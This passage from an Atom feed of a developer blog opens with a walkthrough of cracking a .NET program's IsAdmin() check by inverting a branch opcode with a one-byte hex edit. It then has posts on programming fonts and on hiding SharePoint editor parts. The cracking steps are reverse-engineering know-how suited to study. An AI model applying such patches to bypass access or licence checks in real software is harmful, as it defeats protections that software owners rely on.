        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;labUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Text&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Welcome Admin!&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTP&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTPS&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
      &lt;span class='k'&gt;else&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;labUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Text&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Welcome User!&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTP&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;butAdminHTTPS&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Clearly, our main interest is in &lt;em&gt;IsAdmin()&lt;/em&gt; function which is defined as follows:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='nf'&gt;IsAdmin&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
      &lt;span class='k'&gt;foreach&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;object&lt;/span&gt; &lt;span class='n'&gt;obj&lt;/span&gt; &lt;span class='k'&gt;in&lt;/span&gt; &lt;span class='n'&gt;Dns&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GetHostEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;Dns&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GetHostName&lt;/span&gt;&lt;span class='p'&gt;()).&lt;/span&gt;&lt;span class='n'&gt;AddressList&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;obj&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ToString&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='n'&gt;Equals&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;258.54.54.699&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;))&lt;/span&gt;
          &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
      &lt;span class='p'&gt;}&lt;/span&gt;
      &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Hmmm. Very Interesting !!! Do you understand what is it doing ?&lt;/p&gt;

&lt;p&gt;It basically retrieving the host name of our computer and based on that hostname getting all the IP addresses assigned to the network interfaces present in the system. If any of its IP address matches &lt;em&gt;258.54.54.699&lt;/em&gt;, I am the Admin :).&lt;/p&gt;

&lt;p&gt;Now the interesting part here is that &lt;em&gt;258.54.54.699&lt;/em&gt; is actually an invalid IP address otherwise I could have fooled the program by temporarily assigning this IP address to either one of my interfaces or even write that in &lt;em&gt;hosts&lt;/em&gt; file.&lt;/p&gt;

&lt;p&gt;But since its invalid IP, it will never be returned by system API. So, we must patch the program.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s open the function in &lt;em&gt;ILDASM&lt;/em&gt; and look at its disassembly.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;  IL_001c:  ldloc.1
  IL_001d:  callvirt   instance string [mscorlib]System.Object::ToString()
  IL_0022:  ldstr      &amp;quot;258.54.54.699&amp;quot;
  IL_0027:  callvirt   instance bool [mscorlib]System.String::Equals(string)
  IL_002c:  brfalse.s  IL_0032
  IL_002e:  ldc.i4.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;There are several ways to do it. I will write down from tedious to easiest&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Export the classes from Reflector to Visual Studio solution and change the IP address to our actual IP address. But then Why not just NOP out the call itself :). This requires boring effort&lt;/li&gt;

&lt;li&gt;Use the ILASM or any other utility to change the instruction at &lt;em&gt;ldstr &amp;#8220;258.54.54.699&amp;#8221;&lt;/em&gt; to &lt;em&gt;ldstr actual ip&lt;/em&gt;. Even this requires some effort&lt;/li&gt;

&lt;li&gt;Easiest Way: Actually we can just take advantage of if-else branch reversal.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;#8217;s take a look at disassembly of &lt;em&gt;identifyuser()&lt;/em&gt; function&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/ildasm-output.png' /&gt;&lt;/p&gt;

&lt;p&gt;If you closely look at the disassembly above, the instruction at IL_0006 is doing all the magic which is&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;  IL_0006:  /* 2C   | 29               */ brfalse.s  IL_0031
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;What this instruction means is that if output of &lt;em&gt;IsAdmin()&lt;/em&gt; is false, branch to instruction at IL_0031, the instruction which hides the buttons. Now, we can just change this instruction to reverse, i.e. make it &lt;strong&gt;brtrue.s&lt;/strong&gt;. A quick look at &lt;a href='http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.brtrue_s\(v=vs.71\'&gt;MSDN&lt;/a&gt;.aspx) tells me that its opcode is 2D as opposed to 2C which stands for &lt;strong&gt;brfalse.s&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Now, we just need to fire up the favourite hex editor and &lt;strong&gt;change just one byte.&lt;/strong&gt; from 2C to 2D.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

000005A0  02 28 02 00 00 06 02 28 05 00 00 06 2A 1E 02 28  
000005B0  05 00 00 06 2A 00 00 00 03 30 02 00 5A 00 00 00  
000005C0  00 00 00 00 02 28 06 00 00 06 2D 29 02 7B 02 00  
000005D0  00 04 72 F5 00 00 70 6F 1E 00 00 0A 02 7B 04 00  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Our target lies at offset 5CA which I have already flipped from 2C to 2D as shown above. Let&amp;#8217;s save the file and run it again.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/cracked.png' /&gt;&lt;/p&gt;

&lt;p&gt;Voilla !!! The Administrative buttons are visible and clicking them invokes the Business functions which fetch some HTML output over the internet :)&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Best fonts for programming</title>
   <link href="http://madhur.co.in/blog/2011/09/09/bestfontscode.html"/>
   <updated>2011-09-09T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/09/bestfontscode</id>
   <content type="html">&lt;p&gt;Recently I have been observing the change in the trend in the preferred font for programming.&lt;/p&gt;

&lt;p&gt;Back in the earlier days &lt;em&gt;Courier New&lt;/em&gt; used to be the preferred font for programming. This was the default font in Visual Studio 2008. However, with later operating Systems and tools such as Visual Studio 2010, &lt;em&gt;Consolas&lt;/em&gt; is becoming the top preferred font for programming.&lt;/p&gt;

&lt;p&gt;The screenshot below shows the same code with Courier New and Consolas.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/courier-vs.png' /&gt; &lt;img alt='' src='/images/consolas-vs.png' /&gt;&lt;/p&gt;

&lt;p&gt;The prime difference between two fonts is that Consolas is Clear Type optimized font. &lt;a href='http://en.wikipedia.org/wiki/ClearType'&gt;Clear Type&lt;/a&gt; is the Microsoft implementation of &lt;a href='http://en.wikipedia.org/wiki/TrueType'&gt;True Type&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Programmers also need to work with Console and terminals as well be it Win OS or Linux. Still in Windows 7, 2008 R2, font in Command Prompt or Powershell is by default set to &lt;em&gt;Raster fonts&lt;/em&gt; which by default maps to either &lt;em&gt;Terminal&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;You might be wondering why there are only limited options to set the font in Command prompt or Powershell. You can enable more options by editing the registry as outlined in this &lt;a href='http://support.microsoft.com/default.aspx?scid=kb;EN-US;Q247815'&gt;KB article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The reasoning for this is also detailed by veteran MS employee &lt;strong&gt;Raymond Chen&lt;/strong&gt; in his &lt;a href='http://blogs.msdn.com/b/oldnewthing/archive/2007/05/16/2659903.aspx'&gt;The Old new thing blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Consolas works even better with Consoles and terminal windows as well. The screen shot below compares &lt;em&gt;Terminal&lt;/em&gt; and &lt;em&gt;Consolas&lt;/em&gt; in command prompt. Decide for yourself.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/raster-con.png' /&gt; &lt;img alt='' src='/images/consolas-con.png' /&gt;&lt;/p&gt;

&lt;p&gt;I have also switched from &lt;em&gt;Terminal&lt;/em&gt; to &lt;em&gt;Consolas&lt;/em&gt; in my favourite editor &lt;a href='http://notepad-plus-plus.org/'&gt;Notepad++&lt;/a&gt;. It definitely looks better, see below&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/notepad-term.png' /&gt; &lt;img alt='' src='/images/notepad-cons.png' /&gt;&lt;/p&gt;

&lt;h2 id='installing_consolas_in_linux'&gt;Installing Consolas in Linux&lt;/h2&gt;

&lt;p&gt;You might also want to use Consolas in Linux terminal and Gedit, Gvim or vim.&lt;/p&gt;

&lt;h2 id='method_1'&gt;Method 1&lt;/h2&gt;

&lt;p&gt;Create a &amp;#8216;.fonts&amp;#8217; folder in your home directory and copy the necessary fonts into it. Now you have access to the fonts on a per user basis.&lt;/p&gt;

&lt;h2 id='method_2'&gt;Method 2&lt;/h2&gt;

&lt;p&gt;First find out in which location linux has installed the truetype fonts.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;find /usr -iname \*.ttf |head -n 5
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Once you know the path of the fonts directory, move to this directory and create a folder there (it can be any name). Next copy all the windows ttf fonts to the windowsfonts directory that was just created.&lt;/p&gt;

&lt;p&gt;Now change the ownership of the fonts as well as make sure they have a right of 644 .&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;# chown root.root *.ttf
# chmod 644 *.ttf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Run the command mkfontdir while in the windowsfonts directory.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;# mkfontdir
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will create an index of the fonts in the directory. It will also create two files fonts.dir and fonts.cache-1 . Now moving to the parent directory, edit the file fonts.cache-1 using your favourate editor and append the following line to it.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;File: /usr/share/fonts/truetype/fonts.cache-1
...
&amp;quot;windowsfonts&amp;quot; 0 &amp;quot;.dir&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Lastly run the command fc-cache.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt; fc-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id='other_good_programming_fonts'&gt;Other good programming fonts&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Inconsolata&lt;/li&gt;

&lt;li&gt;Proggy Clean&lt;/li&gt;

&lt;li&gt;Terminus&lt;/li&gt;

&lt;li&gt;Fixed Sys&lt;/li&gt;

&lt;li&gt;Andale Mono&lt;/li&gt;

&lt;li&gt;Anonymous&lt;/li&gt;

&lt;li&gt;Terminus&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='references'&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://www.codeproject.com/KB/work/FontSurvey.aspx'&gt;http://www.codeproject.com/KB/work/FontSurvey.aspx&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://stackoverflow.com/questions/485174/programming-fonts'&gt;http://stackoverflow.com/questions/485174/programming-fonts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Removing the Default Editor Parts from SharePoint Web Parts</title>
   <link href="http://madhur.co.in/blog/2011/09/06/hidingproppane.html"/>
   <updated>2011-09-06T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/06/hidingproppane</id>
   <content type="html">&lt;p&gt;I was recently asked how to remove the Editor Parts (Appearance, Layout, Advanced, etc) from custom Web Parts.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MyEditorPart&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;EditorPart&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;CreateChildControls&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;        &lt;span class='c1'&gt;// this line hides the default EditorParts&lt;/span&gt;
        &lt;span class='n'&gt;Parent&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Controls&lt;/span&gt;&lt;span class='p'&gt;[&lt;/span&gt;&lt;span class='m'&gt;2&lt;/span&gt;&lt;span class='p'&gt;].&lt;/span&gt;&lt;span class='n'&gt;Visible&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;false&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;base&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CreateChildControls&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='nf'&gt;ApplyChanges&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='c1'&gt;// do stuff here&lt;/span&gt;
        &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;SyncChanges&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='c1'&gt;// do stuff here&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MyWebPart&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;WebPart&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='n'&gt;EditorPartCollection&lt;/span&gt; &lt;span class='nf'&gt;CreateEditorParts&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='n'&gt;ArrayList&lt;/span&gt; &lt;span class='n'&gt;aryParts&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;ArrayList&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

        &lt;span class='n'&gt;MyEditorPart&lt;/span&gt; &lt;span class='n'&gt;myEditor&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;MyEditorPart&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
        &lt;span class='n'&gt;myEditor&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ID&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ID&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;_myEditorPart&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='n'&gt;aryParts&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;myEditor&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

        &lt;span class='k'&gt;return&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='nf'&gt;EditorPartCollection&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;aryParts&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='c1'&gt;// do more stuff here...&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 
</feed>